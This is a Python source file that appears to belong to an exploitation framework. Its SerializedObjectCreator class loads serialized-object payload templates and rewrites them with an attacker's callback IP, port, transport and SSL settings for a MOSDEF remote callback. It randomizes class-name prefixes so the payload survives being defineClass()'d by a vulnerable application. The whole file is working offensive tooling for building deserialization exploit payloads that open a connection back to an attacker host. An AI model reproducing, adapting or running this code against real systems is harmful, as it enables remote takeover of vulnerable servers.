import struct
import os
import ast
import random
import logging


class SerializedObjectCreator(object):
    def __init__(self, **kwargs):
        self.set_mosdef_info(**kwargs)
        self.payload_files = {}

    def set_mosdef_info(self, **kwargs):
        self.callback_ip = kwargs.get("callback_ip")
        self.callback_port = str(kwargs.get("callback_port", "5555"))

        # 0 for TCP Mosdef 1 for HTTP Mosdef
        self.use_http = str(int("1" if kwargs.get("use_http") else "0"))
        self.use_ssl = str("True" if kwargs.get("use_ssl") else "False")

        self.default_payload = None
        self.obj_data = None

        # By how many bytes did our modifications impact the size of the payload template?
        self.mod_delta = None

    def replace_string(self, needle, string_value):
        start_idx = self.obj_data.find(needle)
        end_idx = start_idx + len(needle)

        self.obj_data =  self.obj_data[:start_idx-2] + struct.pack(">H", len(string_value)) + \
                         string_value + \
                         self.obj_data[end_idx:]

        if self.mod_delta == None:
            self.mod_delta = 0

        self.mod_delta += len(string_value) - len(needle)

    def dump_options(self):
        logging.info("self.callback_ip  : %s" % self.callback_ip)
        logging.info("self.callback_port: %s" % self.callback_port)
        logging.info("self.use_http     : %s" % self.use_http)
        logging.info("self.use_ssl      : %s" % self.use_ssl)

    def get_payload(self,payload_name=None):
        if payload_name == None:
            if self.default_payload != None:
                payload_name = self.default_payload

        with open(os.path.join(os.path.dirname(__file__), self.payload_files[payload_name]), "rb") as handle:
            self.obj_data = handle.read()

        self.replace_string("MOSDEF_CALLBACK_IP", self.callback_ip)
        self.replace_string("MOSDEF_CALLBACK_PORT", self.callback_port)
        self.replace_string("MOSDEF_HTTP_OR_TCP", self.use_http)
        self.replace_string("MOSDEF_USE_SSL", self.use_ssl)

        # We add this as a prefix to classes that get defineClass()'d (usually by
        # the vulnerable application's code itself) and do not handle duplicate
        # class definitions.
        result = self.obj_data.replace("CLSID", "%05d" % random.randint(0, 99999))

        self.dump_options()

        logging.info("result: %s" % result[-3:])
        return result
